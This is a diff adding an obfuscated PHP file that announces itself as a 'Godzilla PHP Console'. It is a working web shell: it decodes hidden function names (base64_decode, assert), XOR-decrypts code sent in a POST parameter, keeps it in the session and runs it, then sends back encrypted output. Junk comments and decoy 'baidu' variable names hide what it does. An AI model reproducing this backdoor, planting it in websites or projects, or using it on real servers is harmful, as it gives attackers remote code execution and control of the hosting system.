@@ -1,0 +1,39 @@
+Hello Administrator!
+WelCome To Tas9er Godzilla PHP Console!
+<?pHP
+@session_start();
+@set_time_limit(Chr("48"));
+@error_reporting/*fuckgovN1*/(Chr("48"));
+function baiduf(/*fuckgovYAjy*/$baiduCuidsfon,$baiduCUOBr5qpJSy){
+    for($baidun2OE5cVpTHKwp=Chr("48");$baidun2OE5cVpTHKwp<strlen($baiduCuidsfon);$baidun2OE5cVpTHKwp++) {
+        $baiduR5X = $baiduCUOBr5qpJSy[$baidun2OE5cVpTHKwp+Chr("49")&15];
+        $baiduCuidsfon[$baidun2OE5cVpTHKwp] = $baiduCuidsfon[$baidun2OE5cVpTHKwp]^$baiduR5X;
+    }
+    return $baiduCuidsfon;
+}
+$baiduBOEb5YdZo = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
+$base64_baiduf = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
+$baidu34yguxlyCW=("&"^"r").("7"^"V").("I"^":").("p"^"I").("_"^":").$baiduBOEb5YdZo($baiduBOEb5YdZo("Y2c9PQ=="));
+$baiduhIBLnLWY='p'.$baiduBOEb5YdZo($baiduBOEb5YdZo("WVhsc2IyRms="));
+$baidufKViUsxv='66714896'.$baiduBOEb5YdZo("MjBmODEwNTc=");
+$baiduJsxSyFd=("!"^"@").'ss'.Chr("101").'rs';
+$baiduJsxSyFd++;
+if (isset($_POST/*fuckgovKAzMSrc*/[$baidu34yguxlyCW])){
+    $datbaiduJsxSyFd=baiduf/*fuckgovsKdv1svXAZ*/($baiduBOEb5YdZo($_POST[$baidu34yguxlyCW]),$baidufKViUsxv);
+    if (/*fuckgovUZliBqwcfb46*/isset($_SESSION/*fuckgovck*/[$baiduhIBLnLWY])){
+        $baidudPKVDdka=baiduf($_SESSION/*fuckgovN2FQ*/[$baiduhIBLnLWY],$baidufKViUsxv);
+        if (/*fuckgovPHh5nNBgr2QMlXL*/strpos($baidudPKVDdka,$baiduBOEb5YdZo/*fuckgovjSx3p*/($baiduBOEb5YdZo("WjJWMFFtRnphV056U1c1bWJ3PT0=")))===false){
+            $baidudPKVDdka=baiduf/*fuckgov6O153fr3Iz0*/($baidudPKVDdka,$baidufKViUsxv);
+        }
+		define("baiduxCKPSXa3","//baidu91Egf\r\n".$baidudPKVDdka);
+		$baiduJsxSyFd(baiduxCKPSXa3);
+        echo substr(/*fuckgovVcvmtVUnQ63n*/md5/*fuckgovfyCJi*/($baidu34yguxlyCW.$baidufKViUsxv),Chr("48"),16);
+        echo $base64_baiduf(baiduf(@run($datbaiduJsxSyFd),$baidufKViUsxv));
+        echo substr(/*fuckgovr9YnxX28QNP*/md5/*fuckgov3zPLammDT4aSCWF*/($baidu34yguxlyCW.$baidufKViUsxv),16);
+    }else{
+        if (strpos/*fuckgovemFG*/($datbaiduJsxSyFd,$baiduBOEb5YdZo($baiduBOEb5YdZo("WjJWMFFtRnphV056U1c1bWJ3PT0=")))!==false){
+            $_SESSION[$baiduhIBLnLWY]=baiduf($datbaiduJsxSyFd,$baidufKViUsxv);
+        }
+    }
+}
+?>
